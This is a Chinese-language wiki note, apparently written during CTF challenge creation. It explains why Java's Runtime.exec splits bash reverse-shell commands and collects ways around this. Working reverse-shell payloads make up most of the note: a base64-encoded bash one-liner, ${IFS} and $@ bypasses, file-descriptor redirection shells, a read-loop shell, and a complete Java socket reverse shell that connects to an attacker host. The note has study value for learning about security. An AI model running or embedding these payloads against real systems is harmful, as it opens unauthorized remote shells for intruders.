---
{"dg-publish":true,"permalink":"/choco-s-wiki/notes/java-shell/"}
---

磐石出题的时候写wp，当时已经能命令执行了，需求是读flag，想用反弹shell，然后就理所当然的写`Runtime.getRuntime().exec("bash -i >& /dev/tcp/ip/port 0>&1");`  这种格式，但是并没有反弹成功。问了OOOO，他分享了一篇文章给我，原来是java 会处理截断命令进行执行，导致反弹shell的重定向没正常跑，所以收集了一些文章，总结了java如何优雅的反弹shell。

# 理解

`bash -i >& /dev/tcp/ip/port 0>&1`

1. `bash -i `创建一个交互式的bash进程
2. `/dev/tcp/ip/port`，linux中所有的程序都是以文件的形式存在。这句话的意思与ip:port建立了一个TCP连接。
3. `>& command >&file`这种写法也等价于`command >file 2>&1`。(其中2>&1表示的就是将文件描述符2重定向到文件描述符1)
4. `0>&1` 将标准输入重定向到标准输出  
    ![Choco‘s wiki/Notes/media/629073686ecd1e40ed38bb0b1616e980_MD5.jpg](/img/user/Choco%E2%80%98s%20wiki/Notes/media/629073686ecd1e40ed38bb0b1616e980_MD5.jpg)
`nc IP 8888 | /bin/bash | nc IP 9999`

8888端口输入命令，9999端口监听输出执行结果  
将8888监听到的数据作为/bin/bash重定向输入，执行传回来的命令，然后再将执行结果作为输入重定向发送给监听主机的9999端口  
![Choco‘s wiki/Notes/media/9a40782d97fb825fc10433d606a398bf_MD5.jpg](/img/user/Choco%E2%80%98s%20wiki/Notes/media/9a40782d97fb825fc10433d606a398bf_MD5.jpg)

# Java反弹shell 截断
## 绕过空格

究其原因，为什么不能直接`Runtime.getRuntime().exec("bash -i >& /dev/tcp/ip/port 0>&1");`还是因为exec的字符串分割问题  
在spoock博文中有做具体分析，这里直接照搬exec的分析  
在java.lang.Runtime()中存在多个重载的exec()方法，如下所示:

```java

public Process exec(String command)
public Process exec(String command, String[] envp)
public Process exec(String command, String[] envp, File dir)
public Process exec(String cmdarray[])
public Process exec(String[] cmdarray, String[] envp)
public Process exec(String[] cmdarray, String[] envp, File dir)
```

除了常见的`exec(String command)`和`exec(String cmdarray[])`，其他`exec()`都增加了envp和File这些限制。虽然如此，但是最终都是调用相同的方法，本质没有却区别。这些函数存在的意义可以简要地参考调用`java.lang.Runtime.exec`的正确姿势  
分析`exec(String cmdarray[])和exec(String command)`:
```java
// exec(String command) 函数
public Process exec(String command) throws IOException {
    return exec(command, null, null);
}
...
public Process exec(String command, String[] envp, File dir)
    throws IOException {
    if (command.length() == 0)
        throw new IllegalArgumentException("Empty command");

    StringTokenizer st = new StringTokenizer(command);
    String[] cmdarray = new String[st.countTokens()];
    for (int i = 0; st.hasMoreTokens(); i++)
        cmdarray[i] = st.nextToken();
    return exec(cmdarray, envp, dir);
}
...
// exec(String cmdarray[])
public Process exec(String cmdarray[]) throws IOException {
    return exec(cmdarray, null, null);
}
```
这里有可能看到不管是`public Process exec(String command)`还是`public Process exec(String cmdarray[])`最终都调用了`public Process exec(String command, String[] envp, File dir)`，`public Process exec(String[] cmdarray, String[] envp)`这样的具体方法。  
其中有一个函数`StringTokenizer ` 
`StringTokenizer` 通过分割符进行分割，java 默认的分隔符是空格("")、制表符(\t)、换行符(\n)、回车符(\r)  
因此在传入`Runtime.getRuntime().exec("bash -i >& /dev/tcp/ip/port 0>&1");`会被拆分成如下形式 

1 | 2 | 3 | 4 | 5  
-|-|-|-|- 
bash | -i | >& | /dev/tcp/ip/port | 0>&1 

而我们执行`r.exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/ip/port 0>&1"});`,执行到exec(cmdarray, envp, dir);时，cmdarray的参数结果是： 

1 | 2 | 3  
-|-|- 
/bin/bash | -c | bash -i >& /dev/tcp/ip/port 0>&1  
## Base64
因此为了绕过空格，这里直接推荐最放便的base64写法  
`Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}");

## ${IFS}
能否找到一个替换字符，使其通过`StringTokenizer(String str)`不进行分割，但是又被`/bin/bash`能够正确地识别为空格的字符？

还是有解决方法的。

在Linux环境中,`${IFS}`是一个内置的变量，用于标示命令中参数的分隔符。通常他的取值是空格+TAB+换行（0x20 0x09 0x0a）。尝试:  
```sh
❯ echo "abc" | hexdump -C
00000000  61 62 63 0a                                       |abc.|
00000004
❯ echo "a${IFS}b${IFS}c"|hexdump -C
00000000  61 20 09 0a 00 62 20 09  0a 00 63 0a              |a ...b ...c.|
0000000c

```
结果就显示出了`${IFS}`其实就是`0x20 0x09 0x0a`。尝试利用`${IFS}`,于是我们的代码变成了：  
```java
Runtime.getRuntime().exec("/bin/bash -c bash${IFS}-i${IFS}>&/dev/tcp/127.0.0.1/8888<&1");
```

## $@
发现在`linux`中还存在`$@`和`$*`，他们的含义都是`list of all arguments passed to the script`。
尝试命令：
```sh
/bin/sh -c '$@\|sh' xxx  echo ls
```
可以成功地执行`ls`。分析下这个命令，当`bash`解析到`'$@|sh' xxx echo ls`，发现`$@`。`$@`需要取脚本的参数，那么就会解析`xxx echo ls`，由于`$@`只会取脚本参数，会将第一个参数认为是脚本名称(认为`xxx`是脚本名称)，就会取到`echo ls`。那么最终执行的就是`echo ls|sh`，就可以成功地执行`ls`命令了。
```java
Runtime.getRuntime().exec("/bin/bash -c $@\|bash 0 echo bash -i >&/dev/tcp/127.0.0.1/8888 0>&1");
```
最终相当于执行了`echo 'bash -i >&/dev/tcp/127.0.0.1/8888 0>&1'|bash`命令，成功反弹shell。同样地，`/bin/bash -c $*|bash 0 echo bash -i >&/dev/tcp/127.0.0.1/8888 0>&1`也是可以的。

## 不同的重定向

```sh
bash -i 5<>/dev/tcp/host/port 0>&5 1>&5
```
同理，我们按照上述的分析方法对这个反弹shell进行分析。

- `5<>/dev/tcp/host/port`，以读写的方式打开`/dev/tcp/host/port`,并将文件描述符5重定向到`/dev/tcp/host/port`
- `0>&5`，将文件描述符0(标准输入)重定向至文件描述符5
- `1>&5`，将文件描述符1(标准输出)重定向至文件描述符5
![Pasted image 20240701153018.png](/img/user/Choco%E2%80%98s%20wiki/Notes/media/Pasted%20image%2020240701153018.png)
最终的效果就是文件描述符0(标准输入)和文件描述1(标准输出)全部都重定向到`/dev/tcp/host/port`，从而就完成了反弹shell。
对应的Java代码:
```java
r = Runtime.getRuntime()  
p = r.exec(["/bin/bash","-c","bash -i 5<>/dev/tcp/host/port 0>&5 1>&5"] as String[])  
p.waitFor()
```

还有一种
```sh
exec 5<>/dev/tcp/ip/port;cat <&5 \| while read line; do $line >&5; done
```

![Pasted image 20240701153230.png](/img/user/Choco%E2%80%98s%20wiki/Notes/media/Pasted%20image%2020240701153230.png)
1. `exec 5<>/dev/tcp/ip/port`,以读写的方式打开`/dev/tcp/ip/port`,并将文件描述符5重定向到`/dev/tcp/ip/port`
2. `cat <&5`,将文件描述符5的重定向到`cat`中，即cat读取到`&5`的内容。结合1就是cat会读取`/dev/tcp/ip/port`中shell的输入内容。
3. `|`，管道符。将cat读取的结果作为后面的输入；
4. `while read line; do $line >&5; done`，拆开看。`while do done`是shell中`while`的规定语法。其中`read line;`表示的就是会循环读取`cat <&5`的内容，赋值到`line`变量中，之后`$line`会执行`line`语句中的命令，最后`>&5`，表示将当前bash的输出和错误重定向至文件描述符5中，即`/dev/tcp/ip/port`。

对应的Java代码:
```java
r = Runtime.getRuntime()  
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.31.41/8080;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])  
p.waitFor()
```
## 没有bash的解决方案
上面说的反弹shell的方式其实还是利用常见的`bash`反弹shell的原理。既然在java中也存在`socket`,那么我们就可以直接利用Java中的socket建立连接进行反弹shell。如下：  
```java
String host=host;  
int port=port;  
String cmd="/bin/sh";  
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();  
Socket s=new Socket(host,port);  
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();  
OutputStream po=p.getOutputStream(),so=s.getOutputStream();  
while(!s.isClosed()) {  
    while(pi.available()>0) {  
        so.write(pi.read());  
    }  
    while(pe.available()>0) {  
        so.write(pe.read());  
    }  
    while(si.available()>0) {  
        po.write(si.read());  
    }  
    so.flush();  
    po.flush();  
    Thread.sleep(50);  
    try {  
        p.exitValue();  
        break;  
    }  
    catch (Exception e){  
    }  
};  
p.destroy();  
s.close();
```

我们直接通过`Socket s=new Socket(host,port);`这种方式，按照[https://docs.oracle.com/javase/7/docs/technotes/guides/net/ipv6_guide/](https://docs.oracle.com/javase/7/docs/technotes/guides/net/ipv6_guide/)的说明:

> You can run the same bytecode for this example in IPv6 mode if both your local host machine and the destination machine (taranis) are IPv6-enabled.

即如果目标机器和本地机器都支持IPv6，则使用IPv6。

# 参考文章
https://blog.spoock.com/2018/11/07/java-reverse-shell/
https://www.cnblogs.com/BOHB-yunying/p/15523680.html
https://blog.spoock.com/2018/11/25/getshell-bypass-exec/
